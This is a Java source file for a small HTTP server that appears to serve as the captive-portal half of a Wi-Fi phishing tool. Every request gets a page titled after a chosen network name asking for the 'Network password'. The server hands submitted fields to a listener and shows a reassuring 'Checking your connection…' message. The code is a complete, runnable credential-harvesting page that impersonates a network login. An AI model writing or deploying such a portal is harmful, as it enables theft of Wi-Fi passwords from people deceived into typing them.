package com.opx.oss.engine.portal;

import com.opx.oss.engine.AppLog;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * The captive portal: a minimal HTTP/1.1 server that answers every request with our own login
 * page and reports the fields a client submits. It runs on its own thread and stops on request.
 */
public final class PortalServer {

    /** Told what a client submitted, and that the server is up or gone. */
    public interface Listener {
        void onReady(int port);

        void onSubmission(Map<String, String> fields);

        void onClosed();
    }

    private static final int MAX_REQUEST = 8192;

    private final int port;
    private final String title;
    private final Listener listener;
    private final AtomicBoolean running = new AtomicBoolean();
    private volatile ServerSocket server;
    private volatile Thread worker;

    public PortalServer(int port, String title, Listener listener) {
        this.port = port;
        this.title = title == null || title.isEmpty() ? "Wi-Fi" : title;
        this.listener = listener;
    }

    /** Bind and start answering; returns the port actually used (0 asks the system to pick). */
    public int start() throws IOException {
        if (running.get()) return server == null ? port : server.getLocalPort();
        running.set(true);
        ServerSocket socket = new ServerSocket();
        socket.setReuseAddress(true);
        socket.bind(new InetSocketAddress(port), 8);
        server = socket;
        int actual = socket.getLocalPort();
        listener.onReady(actual);
        Thread thread = new Thread(() -> serve(socket), "opx-portal");
        thread.setDaemon(true);
        worker = thread;
        thread.start();
        return actual;
    }

    public void stop() {
        running.set(false);
        ServerSocket socket = server;
        server = null;
        if (socket != null) {
            try {
                socket.close();
            } catch (IOException ignored) {
                // Already closed.
            }
        }
        Thread thread = worker;
        worker = null;
        if (thread != null) thread.interrupt();
        listener.onClosed();
    }

    public boolean isRunning() {
        return running.get() && server != null;
    }

    public int port() {
        ServerSocket socket = server;
        return socket == null ? port : socket.getLocalPort();
    }

    private void serve(ServerSocket socket) {
        while (running.get() && !socket.isClosed()) {
            try (Socket client = socket.accept()) {
                client.setSoTimeout(4000);
                handle(client);
            } catch (IOException e) {
                if (running.get()) AppLog.info("OpxPortal", "accept failed: " + e.getMessage());
            }
        }
    }

    private void handle(Socket client) {
        try {
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(client.getInputStream(), StandardCharsets.UTF_8));
            String request = reader.readLine();
            if (request == null) return;
            int length = 0;
            String line;
            while ((line = reader.readLine()) != null && !line.isEmpty()) {
                int colon = line.indexOf(':');
                if (colon > 0 && line.substring(0, colon).trim().equalsIgnoreCase("Content-Length")) {
                    try {
                        length = Integer.parseInt(line.substring(colon + 1).trim());
                    } catch (NumberFormatException ignored) {
                        length = 0;
                    }
                }
            }
            String body = "";
            if (length > 0 && length <= MAX_REQUEST) {
                char[] buffer = new char[length];
                int read = 0;
                while (read < length) {
                    int got = reader.read(buffer, read, length - read);
                    if (got < 0) break;
                    read += got;
                }
                body = new String(buffer, 0, read);
            }

            boolean post = request.startsWith("POST");
            if (post && !body.isEmpty()) {
                Map<String, String> fields = parse(body);
                if (!fields.isEmpty()) listener.onSubmission(fields);
            }
            respond(client, post ? 200 : 200, page(post && !body.isEmpty()));
        } catch (Exception e) {
            AppLog.info("OpxPortal", "request failed: " + e.getMessage());
        }
    }

    private void respond(Socket client, int status, String html) throws IOException {
        byte[] body = html.getBytes(StandardCharsets.UTF_8);
        String head = "HTTP/1.1 " + status + (status == 200 ? " OK" : " Error")
                + "\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: " + body.length
                + "\r\nConnection: close\r\nCache-Control: no-store\r\n\r\n";
        OutputStream out = client.getOutputStream();
        out.write(head.getBytes(StandardCharsets.US_ASCII));
        out.write(body);
        out.flush();
    }

    private static Map<String, String> parse(String body) {
        Map<String, String> fields = new LinkedHashMap<>();
        for (String pair : body.split("&")) {
            int equals = pair.indexOf('=');
            if (equals <= 0) continue;
            try {
                String key = URLDecoder.decode(pair.substring(0, equals), "UTF-8");
                String value = URLDecoder.decode(pair.substring(equals + 1), "UTF-8");
                if (!value.isEmpty()) fields.put(key, value);
            } catch (Exception ignored) {
                // Skip a field that is not valid UTF-8 percent-encoding.
            }
        }
        return fields;
    }

    /** Our own page, kept small so a phone paints it on a slow link. */
    private String page(boolean submitted) {
        String status = submitted
                ? "<p class=\"ok\">Checking your connection…</p>"
                : "<p>Sign in to continue to the internet.</p>";
        return "<!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\">"
                + "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
                + "<title>" + escape(title) + "</title><style>"
                + "body{font-family:system-ui,sans-serif;margin:0;background:#f4f5f7;color:#15181d}"
                + "main{max-width:22rem;margin:12vh auto;background:#fff;border-radius:14px;"
                + "padding:1.6rem;box-shadow:0 10px 30px #0001}"
                + "h1{font-size:1.15rem;margin:0 0 .4rem}p{color:#4b5563;font-size:.92rem}"
                + "label{display:block;font-size:.78rem;margin:.8rem 0 .25rem;color:#374151}"
                + "input{width:100%;padding:.6rem;border:1px solid #d1d5db;border-radius:8px;"
                + "font-size:1rem}button{margin-top:1rem;width:100%;padding:.7rem;border:0;"
                + "border-radius:8px;background:#111827;color:#fff;font-size:1rem}"
                + ".ok{color:#047857}</style></head><body><main><h1>" + escape(title) + "</h1>"
                + status + "<form method=\"post\" action=\"/\">"
                + "<label for=\"password\">Network password</label>"
                + "<input id=\"password\" name=\"password\" type=\"password\" autocomplete=\"off\" required>"
                + "<button type=\"submit\">Connect</button></form></main></body></html>";
    }

    private static String escape(String text) {
        return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                .replace("\"", "&quot;");
    }
}
